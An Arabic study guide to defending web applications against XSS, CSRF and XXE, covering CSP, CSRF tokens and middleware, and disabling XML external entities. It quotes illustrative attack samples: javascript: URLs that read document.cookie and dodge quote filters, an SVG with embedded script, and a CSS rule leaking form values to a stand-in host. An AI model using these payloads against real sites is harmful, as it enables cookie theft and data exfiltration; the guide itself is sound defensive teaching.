نظرة عامة — من الهجوم إلى الدفاع

في الجزء الثاني من الكتاب، تعلمنا كيفية استغلال تطبيقات الويب باستخدام هجمات XSS وCSRF وXXE. أما الآن في الجزء الثالث، فنحول المنظور: الهدف هو الدفاع عن قاعدة الكود الخاصة بنا ضد هذه الفئات من الهجمات. يقدم كل فصل تقنيات برمجية محددة وتغييرات في الإعداد وقرارات معمارية تُزيل سطح الهجوم أو تُقلصه بشكل كبير.

💻
ف.22 — الدفاع ضد XSS
تنقية DOM، تجنب الواجهات الخطيرة، ترميز الكيانات، ونشر سياسة أمان المحتوى (CSP).
🔒
ف.23 — الدفاع ضد CSRF
التحقق من الترويسات، تنفيذ رموز CSRF، فرض طلبات GET عديمة الحالة، وبناء برمجيات CSRF الوسيطة.
📄
ف.24 — الدفاع ضد XXE
تعطيل الكيانات الخارجية، تقييم صيغ البيانات البديلة (JSON)، وفهم مخاطر تصاعد XXE المتقدمة.

📋 الدفاع دائمًا متعدد الطبقات

لا تحمي تقنية واحدة بالكامل من أيٍّ من هذه الفئات من الهجمات. يجمع الدفاع الفعّال بين استراتيجيات متعددة — أفضل ممارسات البرمجة، وتنقية المدخلات، والتحقق القائم على الرموز، وسياسات مستوى المتصفح — بحيث إذا تجاوز أحد الطبقات، تبقى الطبقات الأخرى في مكانها.

🎯

أهداف التعلم

1
تطبيق أفضل ممارسات البرمجة لمكافحة XSS — بما في ذلك الفرق بين innerText وinnerHTML، والتحقق من القيم الشبيهة بالنصوص، وتحديد المصارف الخطيرة في DOM API (DOMParser وSVG وBlob).
2
ضبط سياسة أمان المحتوى (CSP) لتقييد مصادر النصوص البرمجية وتعطيل unsafe-eval وunsafe-inline، مع شرح كيفية تخفيف CSP لـ XSS على مستوى المتصفح.
3
تنفيذ دفاعات CSRF — بما في ذلك التحقق من ترويسات Origin/Referer، ورموز CSRF ذات الحالة وعديمتها، وبرمجيات مكافحة CSRF الوسيطة على مستوى التطبيق.
4
شرح سبب عدم قيام طلبات HTTP GET بتعديل حالة الخادم أبدًا، وكيف تُزيل هذه القاعدة التصميمية الواحدة أكثر فئات هجمات CSRF شيوعًا.
5
الدفاع ضد XXE عن طريق تعطيل الكيانات الخارجية في محللات XML، وتقييم JSON كبديل أكثر أمانًا، والتعرف على كيفية تصاعد XXE من وصول للقراءة فحسب إلى تنفيذ تعليمات برمجية عن بُعد.
💻

ف.22 — أفضل ممارسات البرمجة لمكافحة XSS

القاعدة الأهم لمنع XSS: «لا تسمح أبدًا لأي بيانات غير منقّاة مقدَّمة من المستخدم بأن تُمرَّر إلى DOM.» من الناحية المثالية، يجب أن تدخل بيانات المستخدم إلى DOM كنصوص عادية فحسب — وليس كـ HTML يُفسّره المتصفح على أنه علامات قابلة للتنفيذ.

القاعدة الأساسية

❌ تجنب: innerHTML

يُفسّر innerHTML وسوم HTML كعناصر DOM فعلية. إذا كانت مدخلات المستخدم تحتوي على وسوم <script> أو سمات معالج الأحداث، فإنها تُنفَّذ كرمز برمجي.

✅ أفضل: innerText

يُعامل innerText كل شيء كنص عادي. تُعرض وسوم HTML كنص حرفي، وليس كـ DOM. هذا أكثر أمانًا بشكل ملحوظ.

// ✗ UNSAFE — tags are interpreted as DOM const userString = '<strong>hello, world!</strong>'; const div = document.querySelector('#userComment'); div.innerHTML = userString; // <strong> renders as bold text // ✓ SAFE — tags are displayed as literal text div.innerText = userString; // shows "<strong>hello, world!</strong>" as text

التحقق من الكائنات الشبيهة بالنصوص

قبل إدراج أي بيانات مستخدم في DOM، تحقق من أنها سلسلة أو رقم أولي (قيمة «شبيهة بالنص»). يجب رفض الكائنات المعقدة مثل الدوال.

// Check if a value is a simple string const isString = function(x) { if (typeof x === 'string' || x instanceof String) { return true; } return false; }; // Check if a value is "string-like" (string or number — safe for DOM) const isStringLike = function(x) { try { return JSON.stringify(JSON.parse(x)) === x; } catch (e) { console.log('not string-like'); } };

🔑 الرفض كخيار افتراضي

السماح لبيانات المستخدم بملء DOM يجب أن يكون خيارًا أخيرًا — ليس الأول. في كل مرة يوجد فيها بديل لا يتطلب حقن DOM، اختره بدلًا من ذلك.

🚿

تنقية مدخلات المستخدم

في بعض الأحيان لا يمكنك تجنب حقن بيانات المستخدم كـ HTML — على سبيل المثال، عندما تتطلب الميزة السماح بوسوم معينة (مثل <b> أو <i>) دون غيرها (مثل <script>). في هذه الحالات، التنقية المكثفة مطلوبة قبل أن تصل أي بيانات إلى DOM.

📖 من الكتاب — تجاوز المرشحات البسيطة

افترض أن المُنقّي يحجب علامات الاقتباس المفردة والمزدوجة ووسوم <script>. لا يزال بإمكان المهاجم تنفيذ الرمز البرمجي باستخدام مخطط JavaScript الزائف:

<!-- No script tags, no quotes — but still executes JavaScript --> <a href="javascript:alert(document.cookie)">click me</a> <!-- Even bypasses quote filtering using String.fromCharCode() --> <a href="javascript:alert(String.fromCharCode(88,83,83))">click me</a> <!-- Alerts "XSS" without any quotes in the payload -->

⚠️ التنقية صعبة للغاية

مواصفات DOM واسعة ومعقدة. أي واجهة برمجية تحوّل النص إلى DOM أو نص إلى نص برمجي هي ناقل محتمل لـ XSS. يكاد يكون من المستحيل تحقيق التنقية الكاملة بحل محلي الصنع — يُفضَّل دائمًا المكتبات المُختبَرة والمُصانة والحمايات الأصلية للمتصفح.

تنقية الروابط التشعبية

عند استخدام مدخلات المستخدم في عناوين URL للتنقل، استفد من تنقية المتصفح المدمجة في وسم <a> بدلًا من بناء مرشحك الخاص:

// ✓ Use a dummy <a> tag to take advantage of browser sanitization const userLink = "<script>alert('hi')</script>"; const goToLink = function() { const dummy = document.createElement('a'); dummy.href = userLink; window.location.href = `https://mywebsite.com/${dummy.href}`; // Browser encodes tags: %3Cscript%3Ealert(...)%3C%2Fscript%3E };

يمكنك أيضًا استخدام encodeURIComponent() لترميز أجزاء URI الفردية. وإن كان نظريًا يمكن الالتفاف عليه، فإن هذه الدوال الأصلية للمتصفح أُختبرت بشكل أفضل بكثير من أي حل مخصص.

⚠️

مصارف DOM API الخطيرة

المصرف هو أي واجهة برمجية تحوّل النص إلى DOM أو نص برمجي قابل للتنفيذ. الواجهات التالية هي أكثر مصارف XSS شيوعًا — تجنبها كلما أمكن، ونقِّ بصرامة عند الضرورة:

الواجهة الخطر البديل الأكثر أمانًا
element.innerHTML / outerHTML يُفسّر وسوم HTML كـ DOM — مصرف XSS مباشر استخدم innerText أو document.createElement()
DOMParser.parseFromString() يحوّل سلسلة إلى شجرة DOM كاملة — وسوم script تُنفَّذ أنشئ عقد DOM يدويًا باستخدام createElement() + appendChild()
SVG صيغة XML تدعم وسوم <script> ومعالجات onload نقِّ أو ارفض ملفات SVG التي يرفعها المستخدمون؛ افضل الصيغ النقطية (PNG وJPG)
Blob + createObjectURL() يمكنه تخزين بيانات تعسفية بما فيها نصوص قابلة للتنفيذ، ثم حقنها عبر script.src تجنب Blob عند تضمين أي جزء من بيانات المستخدم في عملية الإنشاء
document.write() / writeln() يكتب HTML خامًا مباشرة في تدفق المستند لا تستخدمه في التطبيقات الحديثة؛ أنشئ DOM بواجهات API قياسية
📖 من الكتاب — تنفيذ نص SVG البرمجي

ملفات SVG مبنية على XML، مما يعني دعمها لوسوم <script> المدمجة. يمكن لملف SVG مرفوع أن ينفّذ JavaScript تعسفيًا عند تحميله في الصفحة — مما يجعل SVG أكثر خطورة بكثير من صيغ الصور النقطية:

<svg version="1.1" xmlns="http://www.w3.org/2000/svg"> <circle cx="250" cy="250" r="50" fill="red" /> <script type="text/javascript">console.log('test');</script> </svg>

🔑 القاعدة الإرشادية

أي واجهة برمجية تحوّل النص إلى DOM أو نص إلى نص برمجي هي ناقل محتمل لهجوم XSS. افضل الواجهات التي تمنحك تحكمًا صريحًا في إنشاء العناصر (createElement، appendChild) على الواجهات التي تُفسّر السلاسل كعلامات.

🔢

ترميز كيانات HTML

يُحوّل ترميز الكيانات الأحرف التي يُحتمل أن تكون خطيرة إلى ما يعادلها من كيانات HTML. تُعرض الأحرف المُرمَّزة بشكل صحيح في المتصفح لكن لا يمكن تفسيرها كرمز برمجي.

الأحرف «الخمسة الكبار»

الحرف الكيان المُرمَّز أهميته
& &amp; يبدأ تسلسلات الكيانات — يجب الهروب منه لمنع حقن كيانات أخرى
< &lt; يفتح وسوم HTML — الحرف الأساسي المستخدم لبدء <script> والعناصر الخطيرة الأخرى
> &gt; يغلق وسوم HTML
" &#034; يخرج من قيم السمات في سياقات الاقتباس المزدوج
' &#039; يخرج من قيم السمات في سياقات الاقتباس المفرد

⚠️ ترميز الكيانات له حدود

يحمي ترميز الكيانات فقط المحتوى المُحقَن في عناصر جسم HTML (مثل <div> أو <p>). لا يحمي المحتوى المُحقَن داخل وسوم <script> أو CSS أو عناوين URL — لأنه يمكن بناء JavaScript صالح من تسلسلات الأحرف المُرمَّزة بالكيانات في تلك السياقات.

🎨

CSS كناقل هجوم

يُعتبر CSS عادةً تقنية «عرض فحسب»، لكن مواصفاته قوية بما يكفي لاستخدامه كقناة لتسريب البيانات. إذا سمح تطبيقك للمستخدمين بتحميل أوراق أنماط مخصصة، يمكن للمهاجمين استخدام CSS لتسريب بيانات النماذج إلى خوادم خارجية.

📖 من الكتاب — تسريب البيانات عبر CSS

يتيح CSS التنسيق الانتقائي بناءً على قيم حقول النماذج. مقترنًا بـ background:url()، يمكن للمهاجم تشغيل طلبات HTTP GET تُسرّب بيانات النماذج إلى خادم بعيد — دون أي JavaScript على الإطلاق:

/* When the income field is set to ">100k", CSS triggers a GET request */ #income[value=">100k"] { background: url("https://www.hacker.com/incomes?amount=gte100k"); } /* The form value is leaked to the attacker's server via the URL */

ثلاثة مستويات للدفاع ضد CSS

الصعوبة الدفاع
سهل عدم السماح بأوراق أنماط CSS التي يرفعها المستخدمون — الحل الأبسط والأكثر فعالية
متوسط السماح للمستخدمين بتعديل حقول محددة وآمنة فحسب — ثم إنشاء ورقة الأنماط بنفسك على الخادم باستخدام تلك الحقول
صعب تنقية أي سمات CSS تُطلق HTTP (مثل background:url، و@import، إلخ) — صعب للغاية تحقيقه بشكل شامل
🛡

سياسة أمان المحتوى (CSP)

سياسة أمان المحتوى هي ضبط أمان على مستوى المتصفح يُقيّد الرمز البرمجي الذي يمكن تنفيذه داخل تطبيقك. تدعم CSP جميع المتصفحات الرئيسية وتوفر طبقة دفاع أولى قوية ضد XSS.

مصدر النصوص البرمجية (script-src)

تتيح لك CSP إدراج عناوين URL محددة مسموح بتحميل النصوص البرمجية منها في القائمة البيضاء. أي نص برمجي من مصدر غير مُدرج يُحجب ويُلقي المتصفح خطأ انتهاك CSP.

/* CSP header — only allow scripts from your own domain and your API */ Content-Security-Policy: script-src "self" https://api.mega-bank.com /* Attempting to load a script from https://www.hacker.com → BLOCKED */ /* Attempting to load a script from https://api2.mega-bank.com → BLOCKED */

⚠️ تجنب القوائم البيضاء ذات أحرف البدل في CSP

إدراج https://*.mega-bank.com قد يبدو مريحًا، لكن إذا سمح أي نطاق فرعي لاحقًا بتحميل محتوى من المستخدمين (مثل hosting.mega-bank.com)، يمكن للمهاجم استضافة نصوص برمجية خبيثة على ذلك النطاق الفرعي وتجاوز CSP بالكامل. أدرج دائمًا مصادر محددة.

Unsafe Eval و Unsafe Inline

عند تفعيل CSP، يتم تعطيل قدرتين خطيرتين بشكل افتراضي:

unsafe-inline

يسمح بوسوم <script> المضمنة ومعالجات الأحداث المضمنة. معطّل بشكل افتراضي عند تفعيل CSP. إعادة تفعيله يُضعف حماية XSS بشكل كبير.

unsafe-eval

يسمح بـ eval() ودوال تحويل النص إلى رمز مشابهة. معطّل بشكل افتراضي عند تفعيل CSP. إذا كان كودك يستخدم eval، أعد كتابته لتجنب تفسير السلاسل.

📖 من الكتاب — إعادة كتابة كود يشبه eval

الكود الذي يمرر سلاسل إلى دوال مثل setTimeout يمكن في الغالب إعادة كتابته لتجنب تفسير السلاسل بالكلية:

// ✗ UNSAFE — string is interpreted as code (requires unsafe-eval) const startTimer = function(minutes, message) { setTimeout(`window.alert(${message});`, minutes * 60 * 1000); }; // ✓ SAFE — function reference, no string interpretation needed const startTimer = function(minutes, message) { setTimeout(function() { alert(message); }, minutes * 60 * 1000); };

كيفية تنفيذ CSP

  1. 1
    ترويسة HTTP (مُوصى بها)
    أرسل ترويسة Content-Security-Policy مع كل استجابة من الخادم. قيمة الترويسة هي نص السياسة نفسه.
  2. 2
    وسم HTML Meta (بديل)
    ضمِّن وسم <meta http-equiv="Content-Security-Policy" content="..."> في <head> الخاص بـ HTML. أقل مرونة من نهج الترويسة لكن مفيد عندما لا تستطيع التحكم في ترويسات الخادم.

🔑 CSP لا تحمي من DOM XSS

CSP إجراء أول قوي ضد XSS المنعكس والمُخزَّن، لكنها لا تحمي من XSS القائم على DOM — حيث توجد الثغرة كليًا في JavaScript من جانب العميل. يجمع الدفاع الشامل بين CSP وأفضل ممارسات البرمجة الموضحة سابقًا في هذا الفصل.

🔒

ف.23 — التحقق من الترويسات

تنشأ كثير من هجمات CSRF من موقع مختلف عن الموقع المستهدف. لهذا السبب، يمكننا استخدام ترويسات HTTP للتحقق من مصدر كل طلب كخط دفاع أول.

ترويستان للفحص

ترويسة Origin

تُرسَل في طلبات HTTP POST. تشير إلى مكان نشأة الطلب. موجودة في HTTP وHTTPS. لا يمكن تعديلها برمجيًا بواسطة JavaScript في المتصفحات الرئيسية.

ترويسة Referer

تُرسَل في جميع الطلبات (ما لم يُعيَّن rel=noreferer). تشير أيضًا إلى مصدر الطلب. يجب فحصها جانبًا مع ترويسة Origin للدفاع المتعمق.

const validLocations = [ 'https://www.mega-bank.com', 'https://api.mega-bank.com', 'https://portal.mega-bank.com' ]; const validateHeadersAgainstCSRF = function(headers) { const origin = headers.origin; const referer = headers.referer; if (!origin || !referer) { return false; } if (!validLocations.includes(origin) || !validLocations.includes(referer)) { return false; } return true; };

💡 التحقق من الترويسات نقطة بداية

إذا حقق مهاجم XSS على أحد مصادرك المدرجة في القائمة البيضاء، يمكنه بدء هجمات CSRF التي تبدو قادمة من خوادمك الخاصة — متجاوزًا التحقق من الترويسات بالكامل. لهذا يجب دائمًا دمج التحقق من الترويسات مع رموز CSRF ودفاعات أخرى.

🔑

رموز CSRF — الدفاع الأساسي

أقوى الدفاعات الأكثر استخدامًا ضد CSRF هو رمز مكافحة CSRF. تعتمد معظم المواقع الكبرى على رموز CSRF كدفاعها الأساسي ضد CSRF.

كيف تعمل رموز CSRF

  1. 1
    الخادم يولّد رمزًا فريدًا
    يُولَّد الرمز بشكل مشفر باحتمالية تصادم منخفضة جدًا. يُولَّد عادةً مرة واحدة في كل جلسة (وإن كان يمكن إعادة توليده لكل طلب لأمان أعلى).
  2. 2
    العميل يُرسل الرمز مع كل طلب
    يُضمَّن الرمز في كل من إرسالات النماذج وطلبات AJAX. على جانب الخادم، يُتحقق من الرمز للتأكد من أنه حي (غير منتهي الصلاحية)، وأصيل، وغير مُعدَّل. إذا فشل التحقق، يُسجَّل الطلب ويُرفض.
  3. 3
    المهاجمون لا يستطيعون تزوير الرمز
    بما أن كل رمز فريد لكل جلسة ومستخدم، لا يستطيع مهاجم على مصدر مختلف الحصول على رمز صالح. سيحتاج إلى استهداف مستخدم محدد والحصول على رمزه الحالي غير منتهي الصلاحية — وهو هجوم أصعب بكثير.

رموز CSRF عديمة الحالة

تستخدم تطبيقات الويب الحديثة في الغالب واجهات برمجية عديمة الحالة (REST). يمكن تنفيذ رموز CSRF دون تخزين جلسة من جانب الخادم بدمج ثلاثة مكونات:

  • معرّف المستخدم — يربط الرمز بصاحبه بشكل فريد
  • طابع زمني — يُمكّن انتهاء صلاحية الرمز (مثلًا أسبوع واحد)
  • نونس مشفر — موقَّع بمفتاح سري من جانب الخادم لمنع التزوير

🔒 الرموز عديمة الحالة قابلة للتوسع بشكل أفضل

تستهلك رموز CSRF عديمة الحالة موارد خادم أقل من الرموز المُدارة بالجلسات لأنها لا تتطلب من الخادم تتبع الجلسات النشطة. يتحقق الخادم من الرمز باستخدام مفتاحه السري عند وقت الطلب — دون الحاجة إلى الاستعلام عن قاعدة البيانات.

🚫

طلبات GET عديمة الحالة — القاعدة الأساسية

الناقل الأكثر شيوعًا والأسهل استغلالًا لهجوم CSRF هو طلب HTTP GET الذي يُعدّل حالة الخادم. الإصلاح قاعدة تصميم مطلقة: يجب ألا تخزّن طلبات HTTP GET أو تُعدّل أي حالة من جانب الخادم.

❌ ثغرة: GET يُعدّل الحالة

نقطة نهاية GET واحدة تسترجع وتحدث اختياريًا مستخدمًا. يمكن للمهاجم صياغة رابط مثل GET /user?id=123&updates=email:hacker لتعديل بريد المستخدم الإلكتروني بنقرة رابط بسيطة.

✅ آمن: GET وPOST منفصلان

نقسم إلى نقطة نهاية GET (قراءة فحسب) ونقطة نهاية POST (كتابة). لا يمكن لـ GET تعديل الحالة أبدًا، وPOST ليس عرضة لهجمات CSRF القائمة على الروابط أو الصور.

// ✗ VULNERABLE — GET request modifies state const user = function(req, res) { getUserById(req.query.id).then(function(user) { if (req.query.updates) { user.update(req.updates); } // state change in GET! return res.json(user); }); }; // ✓ SAFE — read and write are separate endpoints const getUser = function(req, res) { // GET — read only getUserById(req.query.id).then(function(user) { return res.json(user); }); }; const updateUser = function(req, res) { // POST — writes getUserById(req.query.id).then(function(user) { user.update(req.updates).then(function(updated) { if (!updated) { return res.sendStatus(400); } return res.sendStatus(200); }); }); };

🔑 طبيعة الويب تجعل GET خطيرًا

الروابط والصور وأوراق الأنماط والإطارات كلها تُطلق طلبات HTTP GET تلقائيًا. هذا يجعل GET أكثر انكشافًا لـ CSRF من POST. بالتأكد من أن طلبات GET دائمًا للقراءة فحسب، تُزيل فئة كاملة من هجمات CSRF القائمة على الروابط والصور.

🛠

برمجيات مكافحة CSRF الوسيطة على مستوى التطبيق

دفاعات CSRF فعّالة فحسب عند تطبيقها على مستوى التطبيق كله. نقطة نهاية واحدة غير محمية تكسر السلسلة بأكملها. تدعم حزم خوادم الويب الحديثة البرمجيات الوسيطة — رمز يعمل على كل طلب قبل تنفيذ أي منطق مسار.

const crypto = require('../util/crypto'); const dateTime = require('../util/dateTime'); const session = require('../util/session'); const logger = require('../util/logger'); const validateCSRFToken = function(token, user) { const text_token = crypto.decrypt(token); const user_id = text_token.split(':')[0]; const date = text_token.split(':')[1]; const nonce = text_token.split(':')[2]; let validUser = (user_id === user.id); let validDate = dateTime.lessThan(1, 'week', date); let validNonce = crypto.validateNonce(user_id, date, nonce); return validUser && validDate && validNonce; }; const CSRFShield = function(req, res, next) { if (!validateHeaders(req.headers, req.method) || !validateCSRFToken(req.csrf, session.currentUser)) { logger.log(req); // log the failed attempt return res.sendStatus(401); // reject before any logic runs } return next(); // pass to route handler };

تجمع هذه البرمجية الوسيطة بين التحقق من الترويسات والتحقق من رمز CSRF في فحص واحد يعمل قبل أي منطق مسار. ترفض الطلبات غير الصالحة بحالة 401 وتسجّل المحاولة للمراقبة.

🔧 أتمتة على جانب العميل أيضًا

بما أن البرمجية الوسيطة تتطلب رمز CSRF في كل طلب، أتمتة إرفاق الرمز على جانب العميل أيضًا. يمكنك استخدام نمط الوكيل لتجاوز XMLHttpRequest لتضمين الرمز دائمًا، أو بناء غلاف مكتبة طلبات يُحقن الرمز الصحيح بناءً على طريقة HTTP.

📄

ف.24 — تعطيل الكيانات الخارجية

الدفاع الأساسي ضد XXE بسيط بشكل لافت: عطّل معالجة الكيانات الخارجية في محلل XML الخاص بك. هذا عادةً سطر واحد من الإعداد.

// Java — disable DOCTYPE declarations (which enable external entities) factory.setFeature( "http://apache.org/xml/features/disallow-doctype-decl", true );

⚠️ محللات Java XML محفوفة بالمخاطر بشكل خاص

تُحذّر OWASP تحديدًا أن كثيرًا من محللات Java المستندة إلى XML تُمكّن الكيانات الخارجية بشكل افتراضي. قد يختلف الإعداد الافتراضي حسب اللغة والمحلل — تحقق دائمًا من توثيق محللك صراحةً. لا تفترض أبدًا أن الكيانات الخارجية معطّلة.

🔑 سطر إعداد واحد

XXE من أسهل الثغرات إصلاحًا وأكثرها خطورة إذا تُركت دون إصلاح. تحقق دائمًا من إعداد محلل XML قبل نشر أي تطبيق يعالج XML أو الصيغ المشتقة منه (بما فيها SVG).

🔄

تقييم صيغ البيانات البديلة — XML مقابل JSON

إذا كان تطبيقك يستخدم XML فحسب لحمولات البيانات المهيكلة (وليس للعرض أو التحقق من الرسم البياني)، فإن التحول إلى JSON يُزيل مخاطر XXE كليًا. يخزن JSON أزواج مفاتيح/قيم بصيغة نصية وليس له آلية للإشارة إلى ملفات خارجية.

الفئة XML JSON
حجم الحمولة كبير مضغوط
تعقيد المواصفات عالٍ منخفض
سهولة الاستخدام يتطلب تحليلًا معقدًا بسيط — يُعيَّن مباشرةً إلى كائنات JavaScript
دعم البيانات الوصفية نعم (السمات) لا
التحقق من الرسم البياني مدعوم (XSD) غير مدمج
العرض (مشابه لـ HTML) سهل (XML يشبه DOM) صعب
قابلية القراءة منخفضة عالية
الأمان أقل (كيانات خارجية، DTDs) أعلى (لا آلية لتنفيذ الرمز)

متى تستخدم أيهما

استخدم JSON عندما...

تُرسل واجهتك البرمجية بيانات مهيكلة يفسرها JavaScript. JSON أخف وأبسط وأكثر أمانًا بطبيعته. هو الاختيار الافتراضي لواجهات REST الحديثة.

أبقِ على XML عندما...

يعالج تطبيقك وثائق XML فعلية أو ملفات SVG أو يتطلب التحقق الصارم من الرسم البياني بواسطة XSD. في هذه الحالات، عطّل الكيانات الخارجية وتحقق بصرامة.

💡 بدائل أخرى

إذا لم يكن JSON مناسبًا، فإن YAML وBSON وEDN كلها بدائل قابلة للتطبيق — لكن يجب إخضاع كل منها لتحليل أمني مماثل قبل اعتمادها.

⚠️

مخاطر XXE المتقدمة — التصعيد

كثيرًا ما تبدأ هجمات XXE كـ وصول للقراءة فحسب — يقرأ المهاجم ملفات من نظام ملفات الخادم عبر مراجع الكيانات الخارجية. غير أن هذا الوصول الأولي كثيرًا ما يُشكّل بوابة لهجمات أكثر خطورة.

📖 من الكتاب — XXE كهجوم بوابة

يمنح XXE المهاجم منصة استطلاع تُتيح له الوصول إلى بيانات يتعذر الوصول إليها من خارج خادم الويب. باستخدام هذه البيانات — ملفات الإعداد والبيانات الاعتمادية وعناوين الشبكة الداخلية — يمكن اختراق أجزاء أخرى من التطبيق بسهولة أكبر.

مسار تصعيد XXE

  1. 1
    وصول للقراءة فحسب للملفات
    يقرأ المهاجم ملفات حساسة — /etc/passwd، ملفات إعداد التطبيق، بيانات اعتماد قاعدة البيانات، مفاتيح API.
  2. 2
    فحص الشبكة الداخلية
    باستخدام XXE لإرسال طلبات إلى عناوين IP الداخلية، يرسم المهاجم طوبولوجيا الشبكة الداخلية ويكتشف خدمات أخرى.
  3. 3
    تنفيذ التعليمات البرمجية عن بُعد
    بالبيانات الاعتمادية المسروقة ومعرفة الشبكة الداخلية، يمكن للمهاجم المحتمل تحقيق سيطرة كاملة على الخادم — أبعد بكثير من نقطة الدخول الأولية «للقراءة فحسب» عبر XXE.

⚠️ لا تستهن بـ XXE أبدًا

يمكن أن يتراوح التأثير النهائي لهجوم XXE بين الكشف البسيط عن البيانات وصولًا إلى تنفيذ التعليمات البرمجية عن بُعد والسيطرة الكاملة على الخادم. إمكانية التصعيد هذه هي سبب تصنيف XXE كإحدى أخطر ثغرات تطبيقات الويب — ولماذا يجب معالجته حتى عندما يبدو التأثير الفوري مقتصرًا على قراءة الملفات.

🛡 ملخص الفصول 22–24 — الدفاع ضد هجمات XSS وCSRF وXXE

  • يبدأ دفاع XSS بقاعدة أساسية: لا تسمح أبدًا لبيانات المستخدم غير المنقّاة بالدخول إلى DOM — استخدم innerText بدلًا من innerHTML وتحقق من أن المدخلات شبيهة بالنصوص
  • واجهات DOM الخطيرة (innerHTML وDOMParser وSVG وBlob وdocument.write) هي مصارف XSS الرئيسية — تجنبها أو نقِّ بصرامة
  • يحمي ترميز كيانات HTML المحتوى في عناصر جسم HTML لكن ليس في وسوم script أو CSS أو عناوين URL
  • يمكن استخدام CSS كقناة لتسريب البيانات — لا تسمح بأوراق الأنماط التي يرفعها المستخدمون كلما أمكن
  • سياسة أمان المحتوى (CSP) تُقيّد مصادر النصوص البرمجية وتُعطّل unsafe-eval/unsafe-inline على مستوى المتصفح — لكنها لا تحمي من DOM XSS
  • يجمع دفاع CSRF بين التحقق من الترويسات (Origin + Referer) ورموز مكافحة CSRF (ذات حالة أو عديمتها) وطلبات GET عديمة الحالة
  • القاعدة الأساسية لـ CSRF: يجب ألا تُعدّل طلبات HTTP GET حالة الخادم أبدًا — هذا يُزيل جميع هجمات CSRF القائمة على الروابط والصور
  • يجب أن تعمل برمجيات مكافحة CSRF الوسيطة على كل طلب وعلى مستوى التطبيق كله — نقطة نهاية واحدة غير محمية تكسر الدفاع بأكمله
  • دفاع XXE بسيط: عطّل الكيانات الخارجية في محلل XML — سطر واحد من الإعداد
  • يُزيل JSON مخاطر XXE كليًا وينبغي تفضيله على XML لحمولات الواجهات البرمجية
  • يمكن أن يتصاعد XXE من وصول للقراءة فحسب إلى تنفيذ التعليمات البرمجية عن بُعد — لا تستهن أبدًا بخطورته
